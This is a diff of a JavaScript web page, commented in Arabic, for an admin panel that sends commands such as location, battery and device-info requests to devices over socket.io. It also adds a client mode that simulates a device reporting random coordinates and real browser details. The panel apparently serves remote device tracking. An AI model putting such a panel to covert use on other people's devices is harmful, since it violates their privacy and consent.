+                    // إرسال موقع عشوائي
+                    const locationData = {
+                        lat: 24.7136 + (Math.random() * 0.05 - 0.025),
+                        lng: 46.6753 + (Math.random() * 0.05 - 0.025),
+                        accuracy: Math.floor(Math.random() * 100) + 10
+                    };
+                    
+                    clientSocket.emit('getLocation', {
+                        id: clientDeviceId,
+                        data: locationData
+                    });
+                    
+                    addClientLog('تم إرسال بيانات الموقع إلى الخادم');
+                    break;
+                    
+                case 'battery':
+                    // إرسال حالة بطارية عشوائية
+                    const batteryData = {
+                        level: Math.random() * 100,
+                        charging: Math.random() > 0.5
+                    };
+                    
+                    clientSocket.emit('battery', {
+                        id: clientDeviceId,
+                        data: batteryData
+                    });
+                    
+                    addClientLog('تم إرسال بيانات البطارية إلى الخادم');
+                    break;
+                    
+                case 'deviceInfo':
+                    // إرسال معلومات الجهاز
+                    const deviceInfoData = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screen: { width: screen.width, height: screen.height }
+                    };
+                    
+                    clientSocket.emit('deviceInfo', {
+                        id: clientDeviceId,
+                        extra: deviceInfoData
+                    });
+                    
+                    addClientLog('تم إرسال معلومات الجهاز إلى الخادم');
+                    break;
+                    
+                case 'networkInfo':
+                    // إرسال معلومات شبكة عشوائية
+                    const networkInfoData = {
+                        type: ['wifi', 'cellular', 'unknown'][Math.floor(Math.random() * 3)],
+                        downlink: Math.random() * 10,
+                        rtt: Math.floor(Math.random() * 100)
+                    };
+                    
+                    clientSocket.emit('networkInfo', {
+                        id: clientDeviceId,
+                        data: networkInfoData
+                    });
+                    
+                    addClientLog('تم إرسال معلومات الشبكة إلى الخادم');
+                    break;
+            }
+        }
+
+        // تهيئة التطبيق (وضع الإدارة)
+        function initAdmin() {
             // تهيئة الخريطة
             initMap();
             
@@ -1032,7 +1263,6 @@
                         data: data ? JSON.parse(data) : {}
                     };
                     
-                    // نرسل الأمر إلى السيرفر كما في الكود السابق — إذا السيرفر يدعم اسم حدث محدد يمكن تعديله لاحقًا
                     socket.emit('sendCommand', command);
                     addLog(`تم إرسال الأمر ${action} إلى الجهاز ${deviceId}`);
                     
@@ -1055,8 +1285,7 @@
                 }
                 
                 if (isConnected) {
-                    // اطلب لقطة الأجهزة مجدداً من السيرفر (adminJoin)
-                    socket.emit('adminJoin');
+                    socket.emit('getDevices');
                     addLog('جاري تحديث بيانات الأجهزة...');
                 }
             });
@@ -1071,7 +1300,27 @@
         }
 
         // بدء التطبيق عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', initApp);
+        document.addEventListener('DOMContentLoaded', function() {
+            // تهيئة وضع الإدارة أولاً
+            initAdmin();
+            
+            // أحداث التبديل بين الوضعين
+            switchModeBtn.addEventListener('click', toggleMode);
+            
+            // أحداث وضع العميل
+            connectClientBtn.addEventListener('click', connectClientToServer);
+            sendDataBtn.addEventListener('click', sendClientData);
+            
+            // تحديث معرّف الجهاز عند التغيير
+            clientIdInput.addEventListener('change', function() {
+                clientDeviceId = this.value;
+                addClientLog('تم تحديث معرّف الجهاز: ' + clientDeviceId);
+            });
+            
+            clientNameInput.addEventListener('change', function() {
+                addClientLog('تم تحديث اسم الجهاز: ' + this.value);
+            });
+        });
     </script>
 </body>
 </html>
